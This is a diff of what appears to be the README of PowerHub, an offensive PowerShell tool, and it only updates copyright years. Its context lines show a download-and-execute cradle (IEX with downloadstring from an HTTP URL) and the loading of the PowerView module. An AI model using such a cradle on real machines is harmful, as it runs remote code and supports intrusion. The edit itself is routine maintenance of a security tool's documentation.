@@ -36,7 +36,7 @@ PS C:\Users\avollmer> $K=new-object net.webclient;IEX $K.downloadstring('http://
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-                            written by Adrian Vollmer, 2018-2019
+                            written by Adrian Vollmer, 2018-2021
 Run 'Help-PowerHub' for help
 PS C:\Users\avollmer> lhm powerview
 Name                                Type N  Loaded
@@ -109,7 +109,7 @@ Thanks!
 Author
 ======
 
-Adrian Vollmer, 2018-2020
+Adrian Vollmer, 2018-2021
 
 Disclaimer
 ==========
